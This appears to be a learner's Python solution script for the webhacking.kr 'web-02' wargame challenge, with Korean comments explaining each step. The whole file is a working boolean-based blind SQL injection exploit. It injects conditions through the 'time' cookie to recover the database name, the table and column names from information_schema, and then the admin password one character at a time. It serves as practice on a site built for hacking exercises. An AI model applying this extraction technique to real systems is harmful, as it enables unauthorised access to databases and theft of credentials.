import requests

url = "https://webhacking.kr/challenge/web-02/"     #Set URL
ck = ""                                             #Null Check Variables
db = ""
table = ""
columns = ""
pw = ""
#    --k의 range를 33에서 127까지 해도 상관은 없을 듯.
#    --근데 밑의 방식을 고집하자면 128? 정도부터 아마 NULL 값인지 공백이 출력되는데 이 값을 기점으로 해도 되지 않을까 싶네
for i in range(1,100):                           #   --1 ~ 100 for statements
    if ck==1:                                    #   --If NULL Detact break for statement
        break
    for k in range(33,133):
        cookies = {"Cookie":"PHPSESSID='m29m3ostj5anqicjmsus4qevk9';time=0||if(ord(substr((select database()),{},1))={}),1,0".format(i,k)}
#    --ord 함수는 문자의 아스키 코드 값을 돌려준다고 한다. chr 함수의 경우는 ord와 반대로 동작한다.
#    --select database()의 경우 현재 사용중인 DB를 확인할 수 있다.
#    --substring의 개념은 Python에서 String은 List로 취급받기에 String의 일부만 발췌하면 이가 SubString의 개념이라고 한다.
#    --substring의 개념과 동작 방식을 토대로 substring 함수는 다음과 같은 형식을 취하고 있다고 결론을 내릴 수 있다.
#    --substring(시작할 문자 위치, 가져올 문자 개수)
#    --즉 for문 중 i의 값에 해당하는 순번의 글자의 아스키코드 값을 가져와서 k 값을 통해 일치하는 아스키 코드 값을 찾는다고 보면 될 것 같다.
#    {}와 .format의 관계는 아래와 같이 설명할 수 있다.
#    {}의 안에 .format에서 지정한 값을 넣는다. => 즉, 위 코드와 같이 {}가 두 개가 있고 format(i, k)로 지정하였을 경우
#    첫 번째 {}에는 i 값이 들어갈 것이며 두 번째 {}에는 k 값이 들어갈 것이다.

        r = requests.get(url, cookies=cookies)
#    --r이라는 변수에 위에서 지정한 url에 대해 get method로 가져올 때 cookies parameter를 위에서 지정한 cookies 변수값을 사용하도록 지정해준다.
        if r.text.find("09:00:01") != -1:
#    --find는 특정 문자를 찾고, 이 문자의 위치 값을 반환한다고 한다. 없을 경우 -1 값을 return한다.
#    참고로 find 함수의 형식은 다음과 같다. find(찾을 문자, 찾기 시작할 위치)
#    위치의 경우 지정하지 않을 경우 기본값으로 0이다. 즉, 처음부터 찾는다.
            db += chr(k)
 #   --위의 조건식을 같이 보면 이 알고리즘은 Brutforce 공격과 유사한 알고리즘으로 동작한다고 볼 수 있는데
 #   대상 값을 직접적으로 가져오는 방법이 아닌 True, False 값을 통하여 판단하는 것이다. 즉, r 명령을 실행했을 때
 #   -1이 아닌 값이 반환되었을 때, 즉 일치하는 문자를 찾았을 때 db 변수에 k 아스키값을 문자로 변환시켜 저장한다.
            break
        if k == 132:
            ck = 1

#for i in range(1,100):
#    if ck == 1:
#        break
#    for k in range(33,133):
#        cookies = {"Cookie":"PHPSESSID='m29m3ostj5anqicjmsus41qevk9';time=0||if(ord(substr((SELECT group_concat(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA='chall2'),{},1))={},1,0)".format(i,k)}
#        r = requests.get(url, cookies=cookies)
#        if r.text.find("09:00:01") != -1:
#            table += chr(k)
#            break
#        if k == 132:
#            ck = 1

#for i in range(1,100):
#    if ck == 1:
#        break
#    for k in range(33,133):
#        cookies={"Cookie":"PHPSESSID='m29m3ostj5anqicjmsus4qevk9';time=0||if(ord(substr((select group_concat(COLUMN_NAME) from information_schema.columns where table_name='admin_area_pw'),{},1))={},1,0)".format(i,k)}
#        r = requests.get(url, cookies=cookies)
#        if r.text.find("09:00:01") != -1:
#            columns += chr(k)
#            break
#        if k == 132:
#            ck = 1

for i in range(1,100):
    if ck == 1:
        break
    for k in range(33,133):
        cookies = {"Cookie":"PHPSESSID='m29m3ostj5anqicjmsus4qevk9';time=0||if(ord(substr((select pw from admin_area_pw),{},1))={},1,0)".format(i,k)}
        r = requests.get(url, cookies=cookies)
        if r.text.find("09:00:01") != -1:
            pw += chr(k)
            break
        if k == 132:
            ck = 1
            
print("DB_NAME : {}".format(db))
#print("TABLE_NAME : {}".format(table))
#print("COLUMNS_NAME : {}".format(columns))
#print("PW : {}".format(pw))
